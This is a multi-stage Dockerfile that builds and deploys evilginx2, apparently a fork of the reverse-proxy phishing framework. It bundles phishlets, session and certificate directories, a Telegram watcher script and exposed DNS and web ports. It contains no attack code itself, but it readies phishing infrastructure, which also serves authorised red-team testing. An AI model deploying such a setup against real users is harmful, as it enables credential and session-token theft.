# ---------- Build stage ----------
FROM golang:1.21-alpine AS builder

RUN apk add --no-cache git make gcc musl-dev

WORKDIR /src
COPY . .

# evilginx2 originally predates Go modules - initialize if needed
RUN go mod init github.com/afrikaquality/evilginx2 2>/dev/null || true
RUN go mod tidy
RUN CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /usr/local/bin/evilginx .

# ---------- Runtime stage ----------
FROM alpine:3.19

RUN apk add --no-cache ca-certificates tzdata bash curl su-exec libcap

# Non-root app user
RUN addgroup -S evilginx && adduser -S evilginx -G evilginx

COPY --from=builder /usr/local/bin/evilginx /usr/local/bin/evilginx
COPY --from=builder /src/phishlets /usr/local/share/evilginx/phishlets
COPY entrypoint.sh /entrypoint.sh
COPY telegram-watch.sh /usr/local/bin/telegram-watch.sh
RUN chmod +x /entrypoint.sh /usr/local/bin/telegram-watch.sh && \
    setcap cap_net_bind_service=+ep /usr/local/bin/evilginx

WORKDIR /app
RUN mkdir -p /app/phishlets /app/sessions /app/certs && \
    chown -R evilginx:evilginx /app

# NOTE: no USER directive here - the entrypoint starts as root
# (to fix volume ownership), then drops to 'evilginx' via su-exec.
EXPOSE 53/udp 53/tcp 80/tcp 443/tcp

ENTRYPOINT ["/entrypoint.sh"]
